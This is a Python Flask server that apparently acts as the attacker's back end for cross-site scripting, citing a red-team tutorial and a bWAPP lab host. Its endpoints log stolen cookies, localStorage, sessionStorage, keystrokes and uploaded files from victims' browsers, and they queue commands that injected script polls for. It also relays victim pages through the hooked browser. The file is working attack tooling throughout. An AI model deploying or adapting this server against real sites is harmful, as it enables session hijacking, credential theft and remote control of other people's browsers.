from flask import Flask
from flask import request
from flask_cors import CORS
import base64
import os
import time

# https://redteamzone.com/OffensiveXSS4/
app = Flask(__name__)
cors = CORS(app, resources={r"/*": {"origins": "*"}})

command = ""
isNewFileDownloaded = False
downloadedSite = ""


def encodeBase64(message):
    message_bytes = message.encode("ascii")
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode("ascii")
    return base64_message


def decodeBase64(message):
    base64_bytes = message.encode("ascii")
    message_bytes = base64.b64decode(base64_bytes)
    result = message_bytes.decode("ascii")
    return result


@app.route("/saveCookie", methods=["POST", "GET"])
def saveCookie():
    cookie = ""
    if request.method == "GET":
        cookie = request.args.get("a")
    else:
        cookie = request.form["a"]
    f = open("savedCookies.txt", "a")
    f.write(cookie)
    f.write("\n")
    f.close()
    return ""


@app.route("/saveLocalStorage", methods=["POST", "GET"])
def saveLocalStorage():
    localStorage = ""
    if request.method == "GET":
        localStorage = request.args.get("a")
    else:
        localStorage = request.form["a"]
    f = open("savedLocalStorage.txt", "a")
    f.write(localStorage)
    f.write("\n")
    f.close()
    return ""


@app.route("/saveSessionStorage", methods=["POST", "GET"])
def saveSessionStorage():
    sessionStorage = ""
    if request.method == "GET":
        sessionStorage = request.args.get("a")
    else:
        sessionStorage = request.form["a"]
    f = open("savedSessionStorage.txt", "a")
    f.write(sessionStorage)
    f.write("\n")
    f.close()
    return ""


@app.route("/saveFile", methods=["POST"])
def saveFile():
    separator = "/"
    mainFolder = "./LFIFiles"
    fileContent = request.form["fileContent"]
    fileName = request.form["fileName"]
    fileName = fileName.replace("../", "")

    if fileName.startswith("/"):
        separator = ""
    fullPathFileName = mainFolder + separator + fileName
    filePath = "/".join(fileName.split("/")[0:-1])
    storageFolder = mainFolder + separator + filePath

    if not os.path.exists(storageFolder):
        os.makedirs(storageFolder)
    f = open(fullPathFileName, "a")
    f.write(fileContent)
    f.write("\n")
    f.close()
    return ""


@app.route("/keys", methods=["POST"])
def keys():
    keys = request.form["keys"]
    f = open("savedkeys.txt", "a")
    f.write(keys)
    f.write("\n")
    f.close()
    return ""


@app.route("/getCommand", methods=["POST"])
def getCommand():
    global command
    result = command
    command = ""
    return result


@app.route("/setCommand", methods=["POST"])
def setCommand():
    global command
    command = request.get_data()
    return command


@app.route("/saveSite", methods=["POST"])
def saveSite():
    global isNewFileDownloaded
    global downloadedSite

    siteBase64 = request.form["site"]
    downloadedSite = decodeBase64(siteBase64)
    isNewFileDownloaded = True
    return ""


@app.route("/setSiteCommand", methods=["GET"])
def setSiteCommand():
    global command
    global isNewFileDownloaded
    global downloadedSite
    command = ""
    requestArgs = request.args
    siteValue = ""

    for index, i in enumerate(requestArgs.keys()):
        if index == 0:
            siteValue = requestArgs[i]
        else:
            siteValue = siteValue + "&" + i + "=" + requestArgs[i]
    command = "command=getSite&site=" + encodeBase64(siteValue)
    while not isNewFileDownloaded:
        time.sleep(1)
    isNewFileDownloaded = False

    downloadedSite = downloadedSite.replace(
        '<a href="',
        '<a href="http://127.0.0.1:5000/setSiteCommand?site=http://bee/bWAPP/',
    )
    return downloadedSite


@app.route("/current_site")
def current_site():
    return downloadedSite
